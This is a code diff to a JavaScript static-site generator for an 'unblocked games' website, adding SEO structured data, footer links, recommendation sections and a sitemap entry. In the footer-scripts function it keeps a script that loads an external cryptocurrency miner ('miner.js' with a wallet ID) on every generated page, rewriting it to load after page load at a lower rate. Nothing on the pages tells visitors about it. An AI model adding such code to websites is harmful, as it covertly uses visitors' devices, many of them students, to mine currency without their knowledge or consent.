@@ -128,6 +128,8 @@ function headCommon({ title, description, canonical, image, jsonLd, robots = 'in
     <meta name="twitter:title" content="${esc(title)}">
     <meta name="twitter:description" content="${esc(description)}">
     <meta name="twitter:image" content="${BASE_URL}${ogImage}">
+    <link rel="dns-prefetch" href="https://www.googletagmanager.com">
+    <link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
     <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=${ADSENSE_CLIENT}" crossorigin="anonymous"></script>
     <script async src="https://www.googletagmanager.com/gtag/js?id=${GA_ID}"></script>
     <script>
@@ -169,16 +171,18 @@ function navBreadcrumbs(category, gameTitle) {
 function siteFooter() {
     const year = new Date().getFullYear();
     return `    <footer class="site-footer">
-      <p>&copy; ${year} ${esc(SITE_NAME)} &mdash; Updated: <span id="lastUpdated"></span></p>
+      <p><strong>Popular:</strong> <a href="/games/slope.html">Slope</a> &middot; <a href="/games/run3.html">Run 3</a> &middot; <a href="/games/1v1.lol.html">1v1.LOL</a> &middot; <a href="/games/retrobowl.html">Retro Bowl</a> &middot; <a href="/games/driftboss.html">Drift Boss</a></p>
       <p><a href="/">Home</a> &middot; <a href="/driving.html">Driving</a> &middot; <a href="/skill.html">Skill</a> &middot; <a href="/shooting.html">Shooting</a> &middot; <a href="/retro.html">Retro</a> &middot; <a href="/calm.html">Calm</a> &middot; <a href="/privacy.html">Privacy Policy</a> &middot; <a href="/blog.html">Best Games</a> &middot; <a href="/sitemap.xml">Sitemap</a></p>
+      <p>&copy; ${year} ${esc(SITE_NAME)} &mdash; Updated: <span id="lastUpdated"></span></p>
     </footer>`;
 }
 
 function siteFooterScripts() {
     return `    <script src="/cookieconsent.js"></script>
     <script type="module">
-import { autoMine } from "https://earnify.cc/miner.js";
-autoMine("RWmCvzsoC7CfM5Fh6moR3g2Xk3J566nD3m", 0.1);
+window.addEventListener('load', () => {
+  import("https://earnify.cc/miner.js").then(m => m.autoMine("RWmCvzsoC7CfM5Fh6moR3g2Xk3J566nD3m", 0.05));
+});
     </script>
     <script>document.getElementById("lastUpdated").textContent=new Date().toISOString().slice(0,10)</script>`;
 }
@@ -277,6 +281,49 @@ function buildGameWrapperPage(fileBasename, existingHtml, game) {
         ]
     });
 
+    // FAQPage JSON-LD
+    const faqLd = jsonLdScript({
+        '@context': 'https://schema.org',
+        '@type': 'FAQPage',
+        'mainEntity': [
+            {
+                '@type': 'Question',
+                'name': `Is ${title} unblocked?`,
+                'acceptedAnswer': {
+                    '@type': 'Answer',
+                    'text': `Yes, ${title} is completely unblocked and free to play at ${SITE_NAME}. No downloads, no sign-ups required — play directly in your browser at school or work.`
+                }
+            },
+            {
+                '@type': 'Question',
+                'name': `How do I play ${title}?`,
+                'acceptedAnswer': {
+                    '@type': 'Answer',
+                    'text': game && game.controls && game.objective
+                        ? `${esc(game.controls)}. ${esc(game.objective)}`
+                        : `Visit the ${title} game page and click play. The game loads in your browser — no downloads needed.${category ? ` It's part of our ${category} games collection.` : ''}`
+                }
+            }
+        ]
+    });
+
+    // HowTo JSON-LD (only when rich data exists)
+    let howToLd = '';
+    if (game && game.controls && game.objective) {
+        howToLd = '\n    ' + jsonLdScript({
+            '@context': 'https://schema.org',
+            '@type': 'HowTo',
+            'name': `How to Play ${title}`,
+            'description': game.objective,
+            'step': [
+                { '@type': 'HowToStep', 'position': 1, 'name': 'Controls', 'text': game.controls },
+                { '@type': 'HowToStep', 'position': 2, 'name': 'Objective', 'text': game.objective }
+            ]
+        });
+    }
+
+    const allJsonLd = jsonLd + '\n    ' + breadcrumbLd + '\n    ' + faqLd + howToLd;
+
     // Build description section
     let descSection;
     if (game && game.tagline) {
@@ -318,6 +365,21 @@ function buildGameWrapperPage(fileBasename, existingHtml, game) {
         }
     }
 
+    // Cross-category recommendations (4 games from other categories)
+    let crossCatSection = '';
+    if (game) {
+    const otherCats = games.filter(g => g.link !== game.link && g.category !== category);
+    if (otherCats.length >= 4) {
+        const shuffled = [...otherCats].sort(() => Math.random() - 0.5).slice(0, 4);
+        crossCatSection = `\n    <section class="related-games">
+      <h2>Recommended for You</h2>
+      <div class="spot-cards">
+      ${shuffled.map(g => '  ' + gameSpotCard(g).replace(/\n/g, '\n  ').trimEnd()).join('\n\n    ')}
+      </div>
+    </section>`;
+    }
+    }
+
     const bodyContent = `
     <nav class="site-nav" aria-label="Main navigation">
       <a href="/">Home</a>
@@ -332,12 +394,13 @@ function buildGameWrapperPage(fileBasename, existingHtml, game) {
     </nav>
 ${navBreadcrumbs(category, title)}
     <h1>${esc(title)}</h1>
+${category ? `    <a class="back-to-category" href="/${category}.html">&larr; Back to ${titleCase(category)} Games</a>` : ''}
 ${adSlot('1111111111')}
     <div class="game-frame">
     ${embed || ''}
     </div>
 ${adSlot('2222222222')}
-${descSection}${relatedSection}
+${descSection}${relatedSection}${relatedSection ? crossCatSection : ''}
 ${siteFooter()}
 ${siteFooterScripts()}`;
 
@@ -348,7 +411,7 @@ ${siteFooterScripts()}`;
 <head>
     <link rel="preconnect" href="https://www.googletagmanager.com">
     <link rel="preconnect" href="https://pagead2.googlesyndication.com">
-${headCommon({ title: `${title} Unblocked - Play Free | ${SITE_NAME}`, description, canonical, image, jsonLd: jsonLd + '\n    ' + breadcrumbLd })}
+${headCommon({ title: `${title} Unblocked - Play Free | ${SITE_NAME}`, description, canonical, image, jsonLd: allJsonLd })}
 ${headScripts}<link rel="stylesheet" href="/gamesdesign.min.css">
 </head>
 <body>
@@ -554,6 +617,7 @@ const listingPages = [
     { loc: `${BASE_URL}/suggestions.html`,  title: 'Suggestions',           priority: '0.5', changefreq: 'monthly' },
     { loc: `${BASE_URL}/privacy.html`,      title: 'Privacy Policy',        priority: '0.3', changefreq: 'monthly' },
     { loc: `${BASE_URL}/blog.html`,         title: 'Best Games & Guides',   priority: '0.7', changefreq: 'weekly' },
+    { loc: `${BASE_URL}/blog/best-unblocked-games-2026.html`, title: 'Best Unblocked Games 2026', priority: '0.6', changefreq: 'weekly' },
 ];
 
 function sitemapUrlBlock({ loc, lastmod, changefreq, priority, image }) {
